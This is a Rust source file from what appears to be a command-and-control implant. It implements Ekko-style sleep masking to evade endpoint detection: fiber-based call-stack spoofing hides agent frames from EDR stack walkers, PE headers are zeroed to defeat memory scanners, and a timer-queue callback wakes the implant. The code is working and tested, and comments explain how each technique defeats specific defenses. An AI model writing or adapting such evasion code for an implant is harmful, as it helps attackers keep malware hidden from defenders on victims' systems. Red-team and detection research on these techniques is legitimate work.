// evasion/sleep.rs
//
// Sleep-interval memory protection:
//   - sleep_with_spoofed_stack  — fiber-based clean call stack (legacy, used
//                                 by fallback paths; ekko_sleep supersedes it)
//   - agent_text_section        — locates .text VA+size via PE header walk
//   - ekko_sleep                — full Ekko-style sleep mask (Gaps 1-4)
//   - restore_headers           — private helper for PE header restoration
//
// See the gap-analysis comment inside ekko_sleep for a description of what
// each protection addresses.

// ── Fiber-based Stack Spoof (legacy) ───────────────────────────────────
// Converts the current thread to a fiber, creates a clean fiber whose
// only job is to call Sleep(), switches to it, and switches back on wake.
// During Sleep() the active fiber's stack contains only
//   kernel32!Sleep → ntdll!NtDelayExecution
// so EDR stack walkers see no unbacked agent frames.
//
// Superseded by ekko_sleep, which adds PE header erasure and timer-thread
// wake dispatch.  Kept for the error-path fallback in sleep_with_mask.

#[cfg(target_os = "windows")]
pub fn sleep_with_spoofed_stack(duration_ms: u32) {
    use std::ffi::c_void;
    use std::ptr;

    extern "system" {
        fn ConvertThreadToFiber(param: *mut c_void) -> *mut c_void;
        fn CreateFiber(stack_size: usize,
                       start: unsafe extern "system" fn(*mut c_void),
                       param: *mut c_void) -> *mut c_void;
        fn SwitchToFiber(fiber: *mut c_void);
        fn DeleteFiber(fiber: *mut c_void);
        fn ConvertFiberToThread() -> i32;
        fn Sleep(ms: u32);
    }

    #[repr(C)]
    struct SleepParams { duration_ms: u32, return_fiber: *mut c_void }

    unsafe extern "system" fn clean_fiber_proc(param: *mut c_void) {
        let p = &*(param as *const SleepParams);
        Sleep(p.duration_ms);
        SwitchToFiber(p.return_fiber);
    }

    unsafe {
        let agent_fiber = ConvertThreadToFiber(ptr::null_mut());
        if agent_fiber.is_null() { Sleep(duration_ms); return; }

        let mut params = SleepParams { duration_ms, return_fiber: agent_fiber };
        let clean_fiber = CreateFiber(0, clean_fiber_proc, &mut params as *mut _ as *mut c_void);
        if clean_fiber.is_null() {
            ConvertFiberToThread();
            Sleep(duration_ms);
            return;
        }

        SwitchToFiber(clean_fiber);
        DeleteFiber(clean_fiber);
        ConvertFiberToThread();
    }
}

#[cfg(not(target_os = "windows"))]
pub fn sleep_with_spoofed_stack(duration_ms: u32) {
    std::thread::sleep(std::time::Duration::from_millis(duration_ms as u64));
}

// ── Self-Location ──────────────────────────────────────────────────────

/// Returns the virtual address and size of the agent's `.text` section.
///
/// Calls `GetModuleHandleW(null)` to obtain the image base from the PEB
/// (no header read needed for the address itself), then walks the PE
/// section table to find the entry whose name begins with `.text`.
///
/// Returns `None` if the module base is null, the MZ magic check fails,
/// or no `.text` section entry is found.
#[cfg(target_os = "windows")]
pub fn agent_text_section() -> Option<(*mut u8, usize)> {
    use std::ffi::c_void;

    extern "system" {
        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
    }

    #[repr(C)]
    struct ImageDosHeader { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }

    #[repr(C)]
    struct ImageSectionHeader {
        name: [u8; 8], virtual_size: u32, virtual_address: u32,
        _pad: [u8; 24],
    }

    unsafe {
        let base = GetModuleHandleW(std::ptr::null());
        if base.is_null() { return None; }

        let dos = &*(base as *const ImageDosHeader);
        if dos.e_magic != 0x5A4D { return None; } // "MZ"

        let nt_off   = dos.e_lfanew as usize;
        let file_hdr = (base as *const u8).add(nt_off + 4);
        let num_secs = *(file_hdr.add(2)  as *const u16) as usize;
        let opt_size = *(file_hdr.add(16) as *const u16) as usize;
        let secs     = (base as *const u8).add(nt_off + 4 + 20 + opt_size);

        for i in 0..num_secs {
            let s = &*(secs.add(i * 40) as *const ImageSectionHeader);
            if &s.name[..5] == b".text" {
                let va   = (base as *mut u8).add(s.virtual_address as usize);
                let size = s.virtual_size as usize;
                return Some((va, size));
            }
        }
        None
    }
}

#[cfg(not(target_os = "windows"))]
pub fn agent_text_section() -> Option<(*mut u8, usize)> { None }

// ── Ekko-Style Sleep Mask ──────────────────────────────────────────────
//
// Addresses four gaps in the prior stack-only sleep mask:
//
// Gap 1 — PE image protection
//   The MZ/PE header region (first 4 KiB of the loaded module) is backed up
//   and zeroed before sleep, then restored on wakeup.  Headers are
//   read-only metadata; no executing code uses them at runtime.  Zeroing
//   removes the MZ magic, timestamp, EntryPoint RVA, and other high-
//   confidence field-value signatures that memory scanners match.
//
//   Full .text encryption is not performed here: in a standalone EXE the
//   decrypt callback must itself execute from .text — encrypting .text
//   before the callback runs produces a crash.  For reflective/shellcode
//   deployments (client_dll), call encrypt_text_section/decrypt_text_section
//   from the loader before and after the sleep interval.
//
// Gap 2 — Self-location
//   agent_text_section() (above) locates .text VA+size via PE header walk.
//
// Gap 3 — Timer-thread dispatch
//   The wake signal is sent via CreateTimerQueueTimer.  SetEvent is
//   transmuted to WAITORTIMERCALLBACK and used as the callback directly,
//   so the timer-pool thread runs only Windows code during the entire sleep
//   — no agent frames ever appear on the timer thread.
//
// Gap 4 — Multi-thread stack coverage
//   The sleeping thread converts to a fiber and parks in a clean fiber
//   that blocks on the wake event.  A stack walker sees only:
//     ntdll!NtWaitForSingleObject  ← kernel wait
//     kernel32!WaitForSingleObjectEx
//     clean_fiber_proc             ← .text, suspended fiber context
//   EDR walkers examine only the *active* fiber's stack; the clean fiber
//   is active only for the microseconds before/after the wait.

#[cfg(target_os = "windows")]
pub fn ekko_sleep(duration_ms: u32) {
    use std::ffi::c_void;
    use std::ptr;

    extern "system" {
        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
        fn VirtualProtect(addr: *mut c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> i32;
        fn RtlMoveMemory(dst: *mut c_void, src: *const c_void, len: usize);
        fn CreateEventA(attrs: *mut c_void, manual_reset: i32, init: i32,
                        name: *const i8) -> *mut c_void;
        fn SetEvent(event: *mut c_void) -> i32;
        fn CloseHandle(h: *mut c_void) -> i32;
        fn CreateTimerQueue() -> *mut c_void;
        fn CreateTimerQueueTimer(timer_out: *mut *mut c_void,
                                 queue:     *mut c_void,
                                 callback:  Option<unsafe extern "system" fn(*mut c_void, u8)>,
                                 param:     *mut c_void,
                                 due_ms:    u32,
                                 period_ms: u32,
                                 flags:     u32) -> i32;
        fn DeleteTimerQueueEx(queue: *mut c_void, completion_event: *mut c_void) -> i32;
        fn ConvertThreadToFiber(param: *mut c_void) -> *mut c_void;
        fn CreateFiber(stack: usize,
                       start: unsafe extern "system" fn(*mut c_void),
                       param: *mut c_void) -> *mut c_void;
        fn SwitchToFiber(fiber: *mut c_void);
        fn DeleteFiber(fiber: *mut c_void);
        fn ConvertFiberToThread() -> i32;
        fn WaitForSingleObjectEx(handle: *mut c_void, ms: u32, alertable: i32) -> u32;
        fn Sleep(ms: u32);
    }

    const PAGE_READONLY:      u32 = 0x02;
    const PAGE_READWRITE:     u32 = 0x04;
    const WT_EXECUTEONLYONCE: u32 = 0x00000008;
    const HEADER_BACKUP:     usize = 0x1000; // 4 KiB — covers all standard PE headers
    let invalid_handle: *mut c_void = -1_isize as *mut c_void; // INVALID_HANDLE_VALUE

    // ── Shared state between agent fiber and clean fiber ───────────────
    #[repr(C)]
    struct CleanFiberData {
        wake_event:  *mut c_void,
        timeout_ms:  u32,
        agent_fiber: *mut c_void,
    }

    // Clean fiber entry point.
    // Blocks on wake_event (non-alertable — no APC interruption), then
    // switches back to the agent fiber.  The loop at the end is a safety
    // net; it should never be reached in normal operation.
    unsafe extern "system" fn clean_fiber_proc(param: *mut c_void) {
        let d = &*(param as *const CleanFiberData);
        WaitForSingleObjectEx(d.wake_event, d.timeout_ms, 0);
        SwitchToFiber(d.agent_fiber);
        loop { Sleep(1000); }
    }

    if duration_ms == 0 { return; }

    unsafe {
        // ── 1. Backup and erase PE headers ────────────────────────────
        let module_base = GetModuleHandleW(ptr::null()) as *mut u8;
        let mut header_backup = [0u8; HEADER_BACKUP];
        let mut header_old_prot: u32 = PAGE_READONLY;
        let headers_erased;

        if !module_base.is_null() && *(module_base as *const u16) == 0x5A4D {
            RtlMoveMemory(
                header_backup.as_mut_ptr() as *mut c_void,
                module_base as *const c_void,
                HEADER_BACKUP,
            );
            if VirtualProtect(module_base as *mut c_void, HEADER_BACKUP,
                               PAGE_READWRITE, &mut header_old_prot) != 0
            {
                std::ptr::write_bytes(module_base, 0u8, HEADER_BACKUP);
                headers_erased = true;
            } else {
                headers_erased = false;
            }
        } else {
            headers_erased = false;
        }

        // ── 2. Wake event ─────────────────────────────────────────────
        let wake_event = CreateEventA(ptr::null_mut(), 1, 0, ptr::null());
        if wake_event.is_null() {
            if headers_erased {
                restore_headers(module_base, &header_backup, HEADER_BACKUP, header_old_prot);
            }
            Sleep(duration_ms);
            return;
        }

        // ── 3. Timer queue — SetEvent as callback (Gap 3) ─────────────
        // SetEvent(HANDLE)→BOOL is ABI-compatible with WAITORTIMERCALLBACK
        // on x86-64: rcx = event handle, rdx (BOOLEAN) is ignored by
        // SetEvent, rax (BOOL return) is ignored by the timer infrastructure.
        // The timer-pool thread therefore runs only ntdll/kernel32 code.
        let timer_queue = CreateTimerQueue();
        if timer_queue.is_null() {
            CloseHandle(wake_event);
            if headers_erased {
                restore_headers(module_base, &header_backup, HEADER_BACKUP, header_old_prot);
            }
            Sleep(duration_ms);
            return;
        }

        // SAFETY: fn(PVOID)→BOOL transmuted to fn(PVOID,BOOLEAN)→void;
        // calling convention is compatible on x86-64 Windows as noted above.
        let set_event_cb: Option<unsafe extern "system" fn(*mut c_void, u8)> =
            Some(std::mem::transmute(
                SetEvent as unsafe extern "system" fn(*mut c_void) -> i32
            ));

        let mut wake_timer: *mut c_void = ptr::null_mut();
        CreateTimerQueueTimer(
            &mut wake_timer,
            timer_queue,
            set_event_cb,
            wake_event,       // passed to SetEvent as HANDLE
            duration_ms,      // fire after this many milliseconds
            0,                // period = 0 → one-shot
            WT_EXECUTEONLYONCE,
        );

        // ── 4. Fiber-based clean-stack sleep (Gap 4) ──────────────────
        let agent_fiber = ConvertThreadToFiber(ptr::null_mut());

        if agent_fiber.is_null() {
            // Already a fiber or conversion failed — fall back to direct wait.
            WaitForSingleObjectEx(wake_event, duration_ms + 10_000, 0);
        } else {
            let mut fdata = CleanFiberData {
                wake_event,
                timeout_ms:  duration_ms + 10_000, // 10 s safety margin
                agent_fiber,
            };
            let clean = CreateFiber(
                0,
                clean_fiber_proc,
                &mut fdata as *mut _ as *mut c_void,
            );

            if clean.is_null() {
                ConvertFiberToThread();
                WaitForSingleObjectEx(wake_event, duration_ms + 10_000, 0);
            } else {
                // Switch to clean fiber; agent fiber suspends here.
                // Execution resumes on the next line after the clean fiber
                // calls SwitchToFiber(agent_fiber) post-wake.
                SwitchToFiber(clean);
                // ← Agent fiber resumes here after wake event is set.
                DeleteFiber(clean);
                ConvertFiberToThread();
            }
        }

        // ── 5. Restore PE headers ─────────────────────────────────────
        if headers_erased {
            restore_headers(module_base, &header_backup, HEADER_BACKUP, header_old_prot);
        }

        // ── 6. Cleanup ────────────────────────────────────────────────
        // INVALID_HANDLE_VALUE causes DeleteTimerQueueEx to block until
        // all in-flight callbacks complete, preventing a SetEvent / CloseHandle
        // race on wake_event.
        DeleteTimerQueueEx(timer_queue, invalid_handle);
        CloseHandle(wake_event);
    }
}

/// Restore PE headers from `backup` and re-apply `old_prot`.
///
/// Private helper shared by the three early-exit paths in `ekko_sleep`.
/// The headers are still PAGE_READWRITE when this is called (VirtualProtect
/// changed them before `write_bytes`); we restore content first, then
/// flip permissions back to avoid a window where the headers are zero
/// and readable.
#[cfg(target_os = "windows")]
unsafe fn restore_headers(base: *mut u8, backup: &[u8], size: usize, old_prot: u32) {
    use std::ffi::c_void;
    extern "system" {
        fn VirtualProtect(addr: *mut c_void, n: usize, new: u32, old: *mut u32) -> i32;
        fn RtlMoveMemory(dst: *mut c_void, src: *const c_void, len: usize);
    }
    RtlMoveMemory(base as *mut c_void, backup.as_ptr() as *const c_void, size);
    let mut tmp = 0u32;
    VirtualProtect(base as *mut c_void, size, old_prot, &mut tmp);
}

#[cfg(not(target_os = "windows"))]
pub fn ekko_sleep(duration_ms: u32) {
    std::thread::sleep(std::time::Duration::from_millis(duration_ms as u64));
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::time::{Duration, Instant};

    // ── agent_text_section ────────────────────────────────────────────────

    #[cfg(not(target_os = "windows"))]
    #[test]
    fn returns_none_on_non_windows() {
        assert!(agent_text_section().is_none());
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn returns_some_on_windows() {
        let result = agent_text_section();
        assert!(result.is_some(), ".text section should be found in the test binary");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn text_section_pointer_is_non_null() {
        let (ptr, _) = agent_text_section().unwrap();
        assert!(!ptr.is_null());
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn text_section_size_is_plausible() {
        let (_, size) = agent_text_section().unwrap();
        // Any real binary has at least a few KiB of executable code.
        assert!(size > 1024, ".text should be > 1 KiB, got {size} bytes");
        // Guard against wildly wrong values (> 512 MiB would be a bug).
        assert!(size < 512 * 1024 * 1024, ".text size suspiciously large: {size}");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn text_section_is_deterministic() {
        // Two calls on the same binary must return the same VA and size.
        assert_eq!(agent_text_section(), agent_text_section());
    }

    // ── ekko_sleep ────────────────────────────────────────────────────────

    #[test]
    fn ekko_sleep_zero_returns_immediately() {
        // duration_ms = 0 has an explicit early-return guard.
        let start = Instant::now();
        ekko_sleep(0);
        assert!(
            start.elapsed() < Duration::from_secs(1),
            "ekko_sleep(0) should return immediately, took {:?}",
            start.elapsed()
        );
    }

    #[test]
    fn ekko_sleep_short_duration_completes() {
        // Verify it actually sleeps for approximately the requested duration
        // and does not hang indefinitely.
        let ms: u64 = 50;
        let start = Instant::now();
        ekko_sleep(ms as u32);
        let elapsed = start.elapsed();
        // Generous lower bound for heavily loaded CI schedulers.
        assert!(
            elapsed >= Duration::from_millis(ms / 2),
            "ekko_sleep({ms}) returned too early: {elapsed:?}"
        );
        // Upper bound: should not take more than 10 s for a 50 ms sleep.
        assert!(
            elapsed < Duration::from_secs(10),
            "ekko_sleep({ms}) took too long: {elapsed:?}"
        );
    }

    // ── sleep_with_spoofed_stack ──────────────────────────────────────────

    #[test]
    fn spoofed_stack_zero_does_not_hang() {
        let start = Instant::now();
        sleep_with_spoofed_stack(0);
        assert!(
            start.elapsed() < Duration::from_secs(1),
            "sleep_with_spoofed_stack(0) should return immediately"
        );
    }

    #[test]
    fn spoofed_stack_short_duration_completes() {
        let ms: u64 = 30;
        let start = Instant::now();
        sleep_with_spoofed_stack(ms as u32);
        let elapsed = start.elapsed();
        assert!(
            elapsed >= Duration::from_millis(ms / 2),
            "sleep_with_spoofed_stack({ms}) returned too early: {elapsed:?}"
        );
        assert!(
            elapsed < Duration::from_secs(10),
            "sleep_with_spoofed_stack({ms}) took too long: {elapsed:?}"
        );
    }

    #[test]
    fn spoofed_stack_sleep_is_nonzero_for_nonzero_duration() {
        // Even on a very fast machine, sleeping 20 ms should take > 5 ms.
        let start = Instant::now();
        sleep_with_spoofed_stack(20);
        assert!(
            start.elapsed() >= Duration::from_millis(5),
            "should have slept at least 5 ms"
        );
    }
}
